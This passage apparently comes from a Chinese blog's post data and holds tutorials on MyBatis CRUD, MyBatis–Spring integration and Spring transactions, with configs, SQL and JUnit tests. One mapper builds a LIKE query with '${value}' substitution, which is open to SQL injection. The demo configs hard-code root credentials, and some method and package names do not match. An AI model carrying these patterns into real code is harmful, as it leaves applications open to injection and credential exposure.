&lt;artifactId&gt;slf4j-log4j12&lt;&#x2F;artifactId&gt; &lt;version&gt;1.7.22&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;4.12&lt;&#x2F;version&gt; &lt;scope&gt;test&lt;&#x2F;scope&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit-jupiter&lt;&#x2F;artifactId&gt; &lt;version&gt;RELEASE&lt;&#x2F;version&gt; &lt;scope&gt;compile&lt;&#x2F;scope&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 然后我们编写配置文件，在mian-java 这个目录上点击右键创建一个文件夹，然后选择resource，然后在resource 下创建db.properties 文件，内容如下 1234567jdbc.driver&#x3D;com.mysql.jdbc.Driverjdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.10.128:3306&#x2F;mybatis_dbjdbc.username&#x3D;rootjdbc.password&#x3D;123456jdbc.maxTotal&#x3D;30jdbc.maxIdle&#x3D;10jdbc.initialSize&#x3D;5 其对应的数据库创建方式以及数据插入如下 12345678910111213141516171819202122mysql&gt; create database mybatis_db;Query OK, 1 row affected (0.01 sec)mysql&gt; use mybatis_db;Database changedmysql&gt; create table t_user( -&gt; id int(32) primary key auto_increment, -&gt; username varchar(50), -&gt; jobs varchar(50), -&gt; phone varchar(16));Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; insert into t_user values(1,&quot;zhangsan&quot;,&quot;teacher&quot;,&quot;13142767333&quot;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into t_user values(2,&quot;lisi&quot;,&quot;engineer&quot;,&quot;13142767334&quot;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into t_user values(3,&quot;wangwu&quot;,&quot;pilot&quot;,&quot;12342767334&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; 然后还是在resource 目录下创建一个applicationContext.xml文件，内容如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot; xmlns:tx&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&#x2F;spring-tx-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop-4.3.xsd&quot;&gt; &lt;!--读取db.properties--&gt; &lt;context:property-placeholder location&#x3D;&quot;classpath:db.properties&quot;&#x2F;&gt; &lt;!--配置数据源 --&gt; &lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.apache.commons.dbcp2.BasicDataSource&quot;&gt; &lt;!--数据库驱动 --&gt; &lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;$&#123;jdbc.driver&#125;&quot; &#x2F;&gt; &lt;!--连接数据库的ur1 --&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;$&#123;jdbc.url&#125;&quot; &#x2F;&gt; &lt;!--连接数据库的用户名 --&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;$&#123;jdbc.username&#125;&quot; &#x2F;&gt; &lt;!--连接数据库的密码--&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;jdbc.password&#125;&quot; &#x2F;&gt; &lt;!--最大连接数--&gt; &lt;property name&#x3D;&quot;maxTotal&quot; value&#x3D;&quot;$&#123;jdbc.maxTotal&#125;&quot; &#x2F;&gt; &lt;!--最大空闲连接--&gt; &lt;property name&#x3D;&quot;maxIdle&quot; value&#x3D;&quot;$&#123;jdbc.maxIdle&#125;&quot; &#x2F;&gt; &lt;!--初始化连接数--&gt; &lt;property name&#x3D;&quot;initialSize&quot; value&#x3D;&quot;$&#123;jdbc.initialSize&#125;&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!--事务管理器，依赖于数据源 --&gt; &lt;bean id&#x3D;&quot;transactionManager&quot; class&#x3D;&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!--注册事务管理器驱动，开启事务注解 --&gt; &lt;tx:annotation-driven transaction-manager&#x3D;&quot;transactionManager&quot;&#x2F;&gt; &lt;!--配置MyBatis工厂 --&gt; &lt;bean id&#x3D;&quot;sqlSessionFactory&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;!--注入数据源 --&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot; &#x2F;&gt; &lt;!--指定核心配置文件位置 --&gt; &lt;property name&#x3D;&quot;configLocation&quot; value&#x3D;&quot;classpath:mybatis-config.xml&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; &lt;&#x2F;beans&gt; 这个配置文件中主要是定义了数据库的驱动以及连接池、事务管理器等，在最后配置了Mybatis 的工厂，制定其核心配置文件为mybatis-config.xml，并且使用typeAliases 创建一个别名，关于别名，你可以参考官网文档 https://mybatis.org/mybatis-3/zh/configuration.html#typeAliases 123456789&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;!--配置别名 --&gt; &lt;typeAliases&gt; &lt;package name&#x3D;&quot;com.ssm&quot;&#x2F;&gt; &lt;&#x2F;typeAliases&gt; &lt;&#x2F;configuration&gt; 然后我们开始整合，我们先看下使用传统的DAO 方式如何整合，采用传统DAO 方式整合，我们需要编写DAO 接口以及实现类，并且需要向DAO实现类注入SqlSessionFactory，然后通过方法体通过SqlSessionFactory 创建SqlSession。具体怎么做呢？ 首先，我们创建一个User.java 的用户类，并生成get和set方法以及tostring方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.ssm;public class User &#123; private Integer id; private String username; private String jobs; private String phone; public Integer getId() &#123; return id; &#125; public String getUsername() &#123; return username; &#125; public String getJobs() &#123; return jobs; &#125; public String getPhone() &#123; return phone; &#125; public void setId(Integer id) &#123; this.id &#x3D; id; &#125; public void setUsername(String username) &#123; this.username &#x3D; username; &#125; public void setJobs(String jobs) &#123; this.jobs &#x3D; jobs; &#125; public void setPhone(String phone) &#123; this.phone &#x3D; phone; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;id&#x3D;&quot; + id + &quot;, username&#x3D;&#39;&quot; + username + &#39;\\&#39;&#39; + &quot;, jobs&#x3D;&#39;&quot; + jobs + &#39;\\&#39;&#39; + &quot;, phone&#x3D;&#39;&quot; + phone + &#39;\\&#39;&#39; + &#39;&#125;&#39;; &#125;&#125; 然后我们创建一个UserMappler.xml，编写一个根据用户id查询用户的select 语句 123456789&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;UserMapper&quot;&gt; &lt;!--根据用户编号获取用户信息 --&gt; &lt;select id&#x3D;&quot;findUserById&quot; parameterType&#x3D;&quot;Integer&quot; resultType&#x3D;&quot;User&quot;&gt; select * from t_user where id&#x3D;#&#123;id&#125; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 接着我们在Mybatis-config.xml中创建一个映射文件 123&lt;mappers&gt; &lt;mapper resource&#x3D;&quot;UserMapper.xml&quot; &#x2F;&gt; &lt;&#x2F;mappers&gt; 接着我们创建一个UserDao.java，我们创建一个findUserById 的接口 12345package com.ssm;public interface UserDao &#123; public User findUserById(Integer id);&#125; 我们需要在applicationContext.xml 中定义一个bean，其id 为userDao,并指向clas路径，同时定义一个property，引用sqlSessionFactory，其表示将sqlSessionFactory对象注入该bean 的实例化对象中 123&lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.ssm.UserDaoImpl&quot;&gt; &lt;property name&#x3D;&quot;sqlSessionFactory&quot; ref&#x3D;&quot;sqlSessionFactory&quot;&gt;&lt;&#x2F;property&gt;&lt;&#x2F;bean&gt; 然后我们需要实现UserDao，我们创建一个UserDaoImpl.java文件，内如下 123456789101112package com.ssm;import com.ssm.User;import com.ssm.UserDao;import org.mybatis.spring.support.SqlSessionDaoSupport;public class UserDaoImpl extends SqlSessionDaoSupport implements UserDao &#123; @Override public User findUserByID(Integer id) &#123; return this.getSqlSession().selectOne(&quot;findUserById&quot;,id); &#125;&#125; 接着，我们创建一个测试类 123456789101112131415package com.ssm;import org.junit.jupiter.api.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class DaoTest &#123; @Test public void findUserByIdTest()&#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); User user &#x3D; userDao.findUserByID(1); System.out.println(user); &#125;&#125; 执行结果如下 以上是使用传统Dao方式来进行整合，但是我们会发现采用这种方法实现整合会出现大量冗余代码，为此，我们可以使用Mybatis 提供的Mapper 接口进行实现 MapperFactoryBean 是Mybatis-Spring 提供的一个用于根据Mapper 接口生成Mapper 对象的类，这个类在Spring 配置时候可以配置一下参数 mapperInterface 用于指定接口 SqlSessionFactory 用户指定 SqlSessionFactory SqlSessionTemplate 用户指定 SqlSessionTemplate，如果与SqlSessionFactory同时设定，则只会启用SqlSessionTemplate 了解了基本的配置后，我们就开始使用Mapper 接口的方式进行整合了 首先，我们创建一个UserMapper.java,内容如下 12345package com.ssm;public interface UserMapper &#123; public User findUserById(Integer id);&#125; 同时，创建一个UserMapper.xml 123456789&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;com.ssm.UserMapper&quot;&gt; &lt;!--根据用户编号获取用户信息 --&gt; &lt;select id&#x3D;&quot;findUserById&quot; parameterType&#x3D;&quot;Integer&quot; resultType&#x3D;&quot;User&quot;&gt; select * from t_user where id&#x3D;#&#123;id&#125; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 仔细看你会发现和传统Dao 方式中我们定义接口其实一模一样，不过，接下来可就不一样了，我们需要在spring的配置文件中创建一个id为userMapper 的bean，代码如下 12345&lt;!-- Mapper代理开发（基于MapperFactoryBean）--&gt;&lt;bean id&#x3D;&quot;userMapper&quot; class&#x3D;&quot;org.mybatis.spring.mapper.MapperFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;mapperInterface&quot; value&#x3D;&quot;com.ssm.UserMapper&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;sqlSessionFactory&quot; ref&#x3D;&quot;sqlSessionFactory&quot; &#x2F;&gt;&lt;&#x2F;bean&gt; 这段配置是用来定义Mapper代理开发，也就是基于MapperFactoryBean的配置，然后我们在测试类中进行测试，你会发现我们并没有写UserMapper 的实现类UserMapperImpl,这是与传统DAO方式的区别 12345678@Test public void findUserByIdMapperTest()&#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); UserMapper userMapper &#x3D; (UserMapper) applicationContext.getBean(&quot;userMapper&quot;); User user &#x3D; userMapper.findUserById(1); System.out.println(user); &#125; 执行代码 接下里我们看下给予MapperScannerConfigUre 的整合，在实际的开发过程中，Dao 层会包含很多的接口，如果我们每一个接口都要在Spring中配置对应的Bean，那么这个工作量是相当大的，因此mybatis-spring提供了一种自动扫描的兴衰来配置mybatis中的映射器，即可采用MapperScannerConfigure 类只需要在spring配置文件中定义如下配置即可，我们将spring配置文件中的传统Dao 和基于MapperFactoryBean 的bean 注释掉，增加如下配置 123&lt;bean class&#x3D;&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name&#x3D;&quot;basePackage&quot; value&#x3D;&quot;com.ssm&quot; &#x2F;&gt;&lt;&#x2F;bean&gt; 其中 basePackage 是指定映射接口文件所在的包路径，如果你需要扫描多个包，需要加分号或逗号作为分隔符，它会扫描包内的所有文件 然后我们再次执行对应的测试类，发现一样的效果。你会发现通过这样整合，这种是不是特别简单呢？","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/tags/SpringBoot/"}]},{"title":"使用Mybatis实现数据库的CURD操作","slug":"使用Mybatis实现数据库的CURD操作","date":"2020-04-07T22:45:42.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/cc8ea2d9.html","link":"","permalink":"https://awen.me/posts/cc8ea2d9.html","excerpt":"","text":"MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。 在传统的JDBC 实现中，我们需要把查询过程写在java 类中，这样非常不便于后期维护，而使用Mybatis 则可以将查询语句配置在配置文件中，只需要维护好映射关系即可， 下面我们就来一起看雪如何去使用Mybatis吧。 创建数据库并插入数据首先，我们创建一个mybatis_db 的数据库，然后创建一个表 t_user，在这个表中我们插入几条数据，如下所示: 12345678910111213141516171819202122mysql&gt; create database mybatis_db;Query OK, 1 row affected (0.01 sec)mysql&gt; use mybatis_db;Database changedmysql&gt; create table t_user( -&gt; id int(32) primary key auto_increment, -&gt; username varchar(50), -&gt; jobs varchar(50), -&gt; phone varchar(16));Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; insert into t_user values(1,&quot;zhangsan&quot;,&quot;teacher&quot;,&quot;13142767333&quot;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into t_user values(2,&quot;lisi&quot;,&quot;engineer&quot;,&quot;13142767334&quot;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into t_user values(3,&quot;wangwu&quot;,&quot;pilot&quot;,&quot;12342767334&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; 配置pom.xml 下载jar包我们创建一个maven工程，并配置pom.xml 下载mybatis 和mysql-connect-java 的jar包，目前mybatis 的最新版本是3.5.4 12345678910&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.4&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 整个工程的目录如下 配置mybatis-config接下来，我们在 idea 的resource 中创建一个mybatis-config.xml 的配置文件，内容如下，具体不需要过多解释就是配置JDBC相关的参数以及通过mappers 定义一个mybatis 的映射文件 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;environments default&#x3D;&quot;mysql&quot;&gt; &lt;environment id&#x3D;&quot;mysql&quot;&gt; &lt;transactionManager type&#x3D;&quot;JDBC&quot; &#x2F;&gt; &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt; &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;192.168.10.128:3306&#x2F;mybatis_db&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;123456&quot; &#x2F;&gt; &lt;&#x2F;dataSource&gt; &lt;&#x2F;environment&gt; &lt;&#x2F;environments&gt; &lt;mappers&gt; &lt;mapper resource&#x3D;&quot;UserMapper.xml&quot; &#x2F;&gt; &lt;&#x2F;mappers&gt;&lt;&#x2F;configuration&gt; 创建user类接下里我们创建对于的User类，并生成get和set以及toString 方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.mybatis;public class User &#123; private Integer id; private String username; private String jobs; private String phone; public Integer getId() &#123; return id; &#125; public String getUsername() &#123; return username; &#125; public String getJobs() &#123; return jobs; &#125; public String getPhone() &#123; return phone; &#125; public void setId(Integer id) &#123; this.id &#x3D; id; &#125; public void setUsername(String username) &#123; this.username &#x3D; username; &#125; public void setJobs(String jobs) &#123; this.jobs &#x3D; jobs; &#125; public void setPhone(String phone) &#123; this.phone &#x3D; phone; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;id&#x3D;&quot; + id + &quot;, username&#x3D;&#39;&quot; + username + &#39;\\&#39;&#39; + &quot;, jobs&#x3D;&#39;&quot; + jobs + &#39;\\&#39;&#39; + &quot;, phone&#x3D;&#39;&quot; + phone + &#39;\\&#39;&#39; + &#39;&#125;&#39;; &#125;&#125; 创建测试类配置UserMapper.xml 接下里，我们创建映射文件UserMapper.xml 然后需要制定一个namespace就是 UserMapper，接着写一个select 语句，定义id和参数类型以及resultType，resultMap是指描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素。 123456789&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;UserMapper&quot;&gt; &lt;!--根据用户编号获取用户信息 --&gt; &lt;select id&#x3D;&quot;findUserById&quot; parameterType&#x3D;&quot;Integer&quot; resultType&#x3D;&quot;com.mybatis.User&quot;&gt; select * from t_user where id&#x3D;#&#123;id&#125; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 然后我们创建一个测试类，根据id来查询用户 12345678910111213141516171819202122232425262728293031package com.mybatis;import java.io.InputStream;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import org.junit.jupiter.api.Test;&#x2F;** * @Auth: xxxx * @E-mail: xxx * @title: MybatisTest * @projectName: mybatis * @description: TODO 描述信息 * @Date 2020&#x2F;4&#x2F;7 9:15 下午 **&#x2F;public class MybatisTest &#123; @Test public void findUserByIdTest() throws Exception &#123; String resource &#x3D; &quot;mybatis-config.xml&quot;; InputStream inputStream &#x3D; Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession &#x3D; sqlSessionFactory.openSession(); User user &#x3D; sqlSession.selectOne(&quot;findUserById&quot;, 1); System.out.println(user.toString()); sqlSession.close(); &#125;&#125; 如果我们希望进行模糊查询，则在UserMapper.xml 中定义 1234&lt;select id&#x3D;&quot;findUserByName&quot; parameterType&#x3D;&quot;String&quot; resultType&#x3D;&quot;com.mybatisdemo.User&quot;&gt; select * from t_user where username like concat(&#39;%&#39;,&#39;$&#123;value&#125;&#39;,&#39;%&#39;)&lt;&#x2F;select&gt; 然后在测试类中新建一个方法进行测试 12345678910111213@Test public void findUserByNameTest() throws Exception &#123; String resource &#x3D; &quot;mybatis-config.xml&quot;; InputStream inputStream &#x3D; Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession &#x3D; sqlSessionFactory.openSession(); List&lt;User&gt; users &#x3D; sqlSession.selectList(&quot;findUserByName&quot;,&quot;g&quot;); for (User user:users)&#123; System.out.println(user.toString()); &#125; sqlSession.close(); &#125; 如图所示 接下来我们测试下添加新用户，首先我们在UserMapper.xml 中定义一个insert元素 123&lt;insert id&#x3D;&quot;addUser&quot; parameterType&#x3D;&quot;com.mybatisdemo.User&quot; &gt; insert into t_user(username,jobs,phone) value (#&#123;username&#125;,#&#123;jobs&#125;,#&#123;phone&#125;)&lt;&#x2F;insert&gt; 然后来写测试接口 1234567891011121314151617181920@Testpublic void addUser() throws Exception &#123; String resource &#x3D; &quot;mybatis-config.xml&quot;; InputStream inputStream &#x3D; Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession &#x3D; sqlSessionFactory.openSession(); User user &#x3D; new User(); user.setUsername(&quot;beiluo&quot;); user.setJobs(&quot;DevOps&quot;); user.setPhone(&quot;1314566666&quot;); int rows &#x3D; sqlSession.insert(&quot;addUser&quot;,user); if (rows &gt;0)&#123; System.out.println(&quot;Success add &quot;+ rows +&quot;data！&quot;); &#125;else&#123; System.out.println(&quot;add data fail!&quot;); &#125; sqlSession.commit(); sqlSession.close(); &#125; 如下所示 接下来测试更新 123 &lt;update id&#x3D;&quot;updateUserInfo&quot; parameterType&#x3D;&quot;com.mybatisdemo.User&quot;&gt; update t_user set username&#x3D;#&#123;username&#125;,jobs&#x3D;#&#123;jobs&#125;,phone&#x3D;#&#123;phone&#125; where id &#x3D;#&#123;id&#125;&lt;&#x2F;update&gt; 然后写个测试类 1234567891011121314151617181920212223@Test public void updateUserinfo() throws Exception &#123; String resource &#x3D; &quot;mybatis-config.xml&quot;; InputStream inputStream &#x3D; Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession &#x3D; sqlSessionFactory.openSession(); User user &#x3D; new User(); user.setId(1); user.setUsername(&quot;jike&quot;); user.setJobs(&quot;qa&quot;); user.setPhone(&quot;13142764432&quot;); int rows &#x3D; sqlSession.update(&quot;updateUserInfo&quot;,user); if (rows &gt;0)&#123; System.out.println(&quot;Success update &quot;+ rows +&quot; data！&quot;); &#125;else&#123; System.out.println(&quot;update data fail!&quot;); &#125; sqlSession.commit(); sqlSession.close(); &#125; 执行后如下所示 最后，我们测试下删除功能 123 &lt;delete id&#x3D;&quot;deleteUser&quot; parameterType&#x3D;&quot;com.mybatisdemo.User&quot; &gt; delete from t_user where id&#x3D;#&#123;id&#125;&lt;&#x2F;delete&gt; 测试类如下 @Test public void deleteUser() throws Exception { String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession = sqlSessionFactory.openSession(); int rows = sqlSession.delete(&quot;deleteUser&quot;,1); if (rows &gt;0){ System.out.println(&quot;Success delete &quot;+ rows +&quot; data！&quot;); }else{ System.out.println(&quot;delete data fail!&quot;); } sqlSession.commit(); sqlSession.close(); }执行结果如下","categories":[{"name":"Mybatis","slug":"Mybatis","permalink":"https://awen.me/categories/Mybatis/"}],"tags":[{"name":"Mybatis","slug":"Mybatis","permalink":"https://awen.me/tags/Mybatis/"}]},{"title":"Spring 的事务管理","slug":"spring的事务管理","date":"2020-04-06T09:19:18.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/43b7240c.html","link":"","permalink":"https://awen.me/posts/43b7240c.html","excerpt":"","text":"今天我们一起了解下Spring的数据库事务操作。在操作数据库时，我们经常会使用到事务，为此Spring 提供了专门的用于处理事务的API方便开发者调用，那么本文就着重来讲解下Spring 对于事务的相关功能 Spring 事务的核心接口Spring 通过一个名为spring-tx-4.3.6-RELEASE 的JAR包来管理事务，在这个JAR包中的org.Springframework.transaction 包中包含了三个接口文件: PlatformTramsactionManager 主要用于管理事务，包括获取事务的状态、提交事务和回滚事务； TramsactionDefinition 该接口是事务定义的对象，包括了获取事务的名称、隔离级别、事务的传播行为、超时时间、事务是否只读等; TramsactionStatus 该接口是事务的状态，描述了某一个时间点事务状态信息，包括刷新事务、获取是否存在保存点、是否是新事务、是否回滚、设置事务回滚 实例讲解接下来我们将通过实例的方式来讲解如何使用注解的方式来通过Spring 进行事务的处理，手续我们在maven的pom.xml 中增加事务的JAR包 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-tx&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 我们首先准备一个数据库 123456CREATE TABLE IF NOT EXISTS &#96;user&#96;( &#96;id&#96; INT UNSIGNED AUTO_INCREMENT, &#96;username&#96; VARCHAR(100) NOT NULL, &#96;password&#96; VARCHAR(40) NOT NULL, &#96;jifen&#96; int(10) NOT NULL, PRIMARY KEY ( &#96;id&#96; ))ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 然后向数据库中写入一些数据，包括了用户名、密码和积分，如下所示 123456789MariaDB [spring_db]&gt; select * from user;+----+----------+----------+-------+| id | username | password | jifen |+----+----------+----------+-------+| 1 | zhangsan | 123 | 1000 || 2 | lisi | 1234 | 1000 || 3 | wangwu | 1234 | 1000 |+----+----------+----------+-------+3 rows in set (0.000 sec) 我们要做的事情就是把张三的积分转给李四 我们需要创建一个 User 类，如下 1234567891011121314151617181920212223242526272829303132333435package com.SpringDemo;public class User &#123; private Integer id; private String username; private String password; private Integer jifen; public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id &#x3D; id; &#125; public String getUsername() &#123; return username; &#125; public void setJifen(Integer jifen)&#123; this.jifen &#x3D; jifen; &#125; public Integer getjifen() &#123; return jifen; &#125; public void setUsername(String username) &#123; this.username &#x3D; username; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password &#x3D; password; &#125; public String toString() &#123; return &quot;User [id&#x3D;&quot; + id + &quot;, username&#x3D;&quot; + username + &quot;, password&#x3D;&quot; + password + &quot;]&quot;; &#125;&#125; 然后创建一个接口 UserDao 1234567891011121314package com.SpringDemo;import java.util.List;public interface UserDao &#123; public int addUser(User user); public int updateUser(User user); public int deleteUser(int id); &#x2F;&#x2F;通过id查询用户 public User findUserById(int id); &#x2F;&#x2F;查询所有用户 public List&lt;User&gt; findAllUser(); public void transfer(String outUser,String inUser,Integer jifen);&#125; 在UserDao 接口中我们定义了一个transfer 的方法，它包含了三个参数分别是outUser、inUser、jifen 接来下我们定义实现类 UserDAOImpl 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package com.SpringDemo;import org.springframework.jdbc.core.BeanPropertyRowMapper;import org.springframework.jdbc.core.JdbcTemplate;import org.springframework.jdbc.core.RowMapper;import org.springframework.transaction.annotation.Isolation;import org.springframework.transaction.annotation.Propagation;import org.springframework.transaction.annotation.Transactional;import java.util.List;public class UserDaoImpl implements UserDao &#123; private JdbcTemplate jdbcTemplate; public void setJdbcTemplate(JdbcTemplate jdbcTemplate) &#123; this.jdbcTemplate &#x3D; jdbcTemplate; &#125; @Override public int addUser(User user) &#123; String sql&#x3D;&quot;insert into user(username,password) value(?,?)&quot;; Object[] obj&#x3D;new Object[]&#123; user.getUsername(), user.getPassword() &#125;; int num&#x3D;this.jdbcTemplate.update(sql,obj); return num; &#125; @Override public int updateUser(User user) &#123; String sql&#x3D;&quot;update user set 